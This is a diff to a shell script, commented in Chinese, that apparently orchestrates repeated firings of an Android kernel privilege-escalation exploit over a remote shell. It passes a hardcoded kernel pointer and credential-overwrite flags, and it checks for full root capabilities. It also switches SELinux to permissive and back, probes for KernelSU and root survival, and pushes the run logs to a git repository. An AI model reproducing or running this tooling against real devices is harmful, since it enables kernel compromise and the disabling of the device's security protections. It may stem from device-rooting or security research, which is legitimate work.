@@ -128,6 +128,17 @@ fi
 
 # ── 1. 可选: 跑前整备 ────────────────────────────────────────
 RESTORE=0
+RESTORED=0
+# 无论正常结束还是被打断, 都不让整备设置留在设备上
+restore_cond(){
+  [ "${RESTORE:-0}" = "1" ] || return 0
+  [ "${RESTORED:-0}" = "1" ] && return 0
+  RESTORED=1
+  rsh 'settings put global hide_error_dialogs 0' 20 >/dev/null 2>&1
+  rsh 'settings put global window_animation_scale 1; settings put global transition_animation_scale 1; settings put global animator_duration_scale 1' 30 >/dev/null 2>&1
+  say "整备设置已还原 (hide_error_dialogs=0, 动画=1)"
+}
+trap 'restore_cond' EXIT INT TERM
 if [ "$COND" = "1" ]; then
   say "整备: kill-all / 关动画 / 藏崩溃弹窗 / stayon / 免电池优化"
   rsh 'am kill-all' 60 >/dev/null 2>&1
@@ -143,8 +154,9 @@ if [ "$COND" = "1" ]; then
 fi
 
 # ── 2. 残留取证: 脏设备不开火 ────────────────────────────────
-RES=$(rish_raw 'for p in $(pgrep -x sleep 2>/dev/null); do for t in /proc/$p/task/*; do cat $t/wchan 2>/dev/null; done; done' 60 | tr -d '\r' | grep -c . )
-say "残留检查: sleeper 线程=$RES"
+# 只数"我们的"轮次进程(environ 带 preload.so), 避免把系统/别的 sleep 误判成残留
+RES=$(rish_raw 'c=0; for p in $(pgrep -x sleep 2>/dev/null); do tr "\000" "\n" < /proc/$p/environ 2>/dev/null | grep -q "preload.so" && c=$((c+1)); done; echo $c' 60 | tr -d '\r' | tr -dc '0-9')
+say "残留检查: 我们的轮次进程=$RES"
 if [ "${RES:-0}" -gt 0 ]; then
   say "!! 有残留轮次进程 — 请硬重启手机后重跑 (不在脏设备上开火)"
   exit 5
@@ -178,8 +190,11 @@ if [ "$CHECK" = "1" ]; then
 fi
 
 # ── 4. 开火原语 (env 在重定向前; 这是历史 bug 的位置) ────────
-R_ENV="PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 PSELECT_RETRY=1 PSELECT_PTR_MODE=1 PSELECT_PTR_STAGE=R PSELECT_PTR_STRICT=1 PSELECT_PTR_RIGHT=ffffff80027b0ae0 PSELECT_CONSUMER_CPU=6 PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 PSELECT_WAITER_WAKE_SECONDS=3 PSELECT_WINDOW_SECONDS=20 PSELECT_NO_CANARY=1"
-E5_ENV="PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 PSELECT_RETRY=1 PSELECT_SELINUX_ENF=1 PSELECT_CONSUMER_CPU=6 PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 PSELECT_WAITER_WAKE_SECONDS=3 PSELECT_WINDOW_SECONDS=20 PSELECT_NO_CANARY=1"
+SLIDE_BASE="PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 PSELECT_RETRY=1 PSELECT_CONSUMER_CPU=6 PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 PSELECT_WAITER_WAKE_SECONDS=3 PSELECT_WINDOW_SECONDS=20 PSELECT_NO_CANARY=1"
+PTR_BASE="PSELECT_PTR_MODE=1 PSELECT_PTR_STRICT=1 PSELECT_PTR_RIGHT=ffffff80027b0ae0"
+R_ENV="$SLIDE_BASE $PTR_BASE PSELECT_PTR_STAGE=R"
+C_ENV="$SLIDE_BASE $PTR_BASE PSELECT_PTR_STAGE=C"
+E5_ENV="$SLIDE_BASE PSELECT_SELINUX_ENF=1"
 E5R_ENV="$E5_ENV PSELECT_SELINUX_ENF_VALUE=SPRAY1"
 
 fire(){ # fire <name> <env> [task]
@@ -194,19 +209,23 @@ fired_ok(){ # 开火自证: 输出文件存在且非空
   _sz=$(rsh_q "wc -c < /data/local/tmp/$_n.out 2>/dev/null" | tr -dc '0-9')
   case "$_sz" in ''|0) return 1 ;; *) return 0 ;; esac
 }
-hb_fresh(){ # G1: 心跳 <30s
+hb_fresh(){ # G1: 心跳新鲜。无参=现在<30s; 带 since=本轮内写过即可
   _now=$(rsh_q 'date +%s'); _mt=$(rsh_q 'stat -c %Y /data/local/tmp/mt49_child_status.txt 2>/dev/null')
   case "$_now$_mt" in ''|*[!0-9]*) return 1 ;; esac
+  if [ -n "${1:-}" ]; then
+    # 轮次内刷新过就算新鲜: 避免"已落地但父进程退场后心跳停了"被判成陈旧(假阴性)
+    [ "$_mt" -ge "$1" ] && return 0
+  fi
   [ $((_now - _mt)) -le 30 ]
 }
 bootid_now(){ rsh_q 'cat /proc/sys/kernel/random/boot_id'; }
-rgate(){ # 严格 R 判据: CapEff 满 + 心跳新鲜 + boot 未变
+rgate(){ # 严格 R 判据: CapEff 满 + 本轮内刷新过 + boot 未变
   _st=$(rish_raw 'cat /data/local/tmp/mt49_child_status.txt 2>/dev/null' 30 | tr -d '\r')
   case "$_st" in
     *"CapEff=000001ffffffffff"*) ;;
     *) echo "R_MISS"; return ;;
   esac
-  hb_fresh || { echo "R_STALE"; return; }
+  hb_fresh "${ROUND_T0:-}" || { echo "R_STALE"; return; }
   [ "$(bootid_now)" = "$BOOT0" ] || { echo "R_REBOOTED"; return; }
   echo "R_LANDED"
 }
@@ -223,6 +242,7 @@ rr=1
 while [ "$rr" -le "$RMAX" ]; do
   say "── R 掷 $rr/$RMAX ──"
   T0=$(date +%s)
+  ROUND_T0=$T0
   if ! cleangate; then
     say "!! 门槛文件清理失败 — 跳过本轮 (不用陈旧状态赌博)"
     rr=$((rr + 1)); continue
@@ -277,7 +297,6 @@ fi
 C_VERDICT="C_NOT_FIRED"
 if hb_fresh && [ "$(bootid_now)" = "$BOOT0" ]; then
   say "── C 单发 (task=$TASK) ──"
-  C_ENV="$R_ENV PSELECT_PTR_STAGE=C"
   fire "C1" "$C_ENV" "$TASK"
   if fired_ok "C1"; then
     C_VERDICT="C_FIRED"
@@ -293,21 +312,26 @@ if hb_fresh && [ "$(bootid_now)" = "$BOOT0" ]; then
     [ -n "$RA" ] && say "root_alive=[$RA]"
     w=$((w + 1))
   done
+  # C 期间是否发生重启(panic/看门狗) — 决定后面怎么解读, 且不再尝试还原
+  if [ "$(bootid_now)" != "$BOOT0" ]; then
+    C_VERDICT="REBOOTED_DURING_C"
+    say "!! C 期间设备重启 (boot_id 变化) — 按 panic/看门狗解读, 不还原 enforce"
+  fi
 else
   say "!! child 心跳陈旧或设备重启 — C 不击 (G1)"
   KSU=0
 fi
 
 # ── 8. 还原 + 判定 ──────────────────────────────────────────
-if [ "$(rsh_q 'getenforce')" = "Permissive" ]; then
+if [ "${C_VERDICT:-}" = "REBOOTED_DURING_C" ]; then
+  say "设备已重启 — 跳过 E5R 还原 (reboot 后本身回到 Enforcing)"
+elif [ "$(rsh_q 'getenforce')" = "Permissive" ]; then
   say "还原 enforcing..."
   fire "E5R1" "$E5R_ENV"
   say "E5R 后 enforce=$(rsh_q 'getenforce')"
 fi
 if [ "$RESTORE" = "1" ]; then
-  rsh 'settings put global hide_error_dialogs 0' 20 >/dev/null 2>&1
-  rsh 'settings put global window_animation_scale 1; settings put global transition_animation_scale 1; settings put global animator_duration_scale 1' 30 >/dev/null 2>&1
-  say "整备设置已还原"
+  restore_cond
 fi
 
 KSU=${KSU:-0}
@@ -344,9 +368,11 @@ if [ "$PUSH" = "1" ]; then
   if [ -d "$WORK/.git" ]; then
     mkdir -p "$WORK/logs_raw/land_$RUN_TS"
     cp "$CARD" "$WORK/logs_raw/land_$RUN_TS/" 2>/dev/null
-    for n in R1 R2 R3 R4 R5 R6 E5a E5b C1 E5R1; do
-      rish_raw "cat /data/local/tmp/$n.out" 60 > "$WORK/logs_raw/land_$RUN_TS/${n}.out" 2>/dev/null
-      [ -s "$WORK/logs_raw/land_$RUN_TS/${n}.out" ] || rm -f "$WORK/logs_raw/land_$RUN_TS/${n}.out"
+    # 按实际存在的轮次文件收集(R1..Rn / E51..E5n / C1 / E5R1), 不写死名字
+    for n in $(rsh_q 'ls /data/local/tmp/R*.out /data/local/tmp/E5*.out /data/local/tmp/C1.out 2>/dev/null'); do
+      _b=$(basename "$n")
+      rish_raw "cat $n" 60 > "$WORK/logs_raw/land_$RUN_TS/$_b" 2>/dev/null
+      [ -s "$WORK/logs_raw/land_$RUN_TS/$_b" ] || rm -f "$WORK/logs_raw/land_$RUN_TS/$_b"
     done
     (cd "$WORK" && git add -A >/dev/null 2>&1 && git commit -q -m "land $RUN_TS: R=$R_VERDICT C=$C_VERDICT ksu=$KSU root_alive=$RA_YES" >/dev/null 2>&1; git push -q origin master 2>/dev/null) && say "已推送" || say "推送失败"
   else
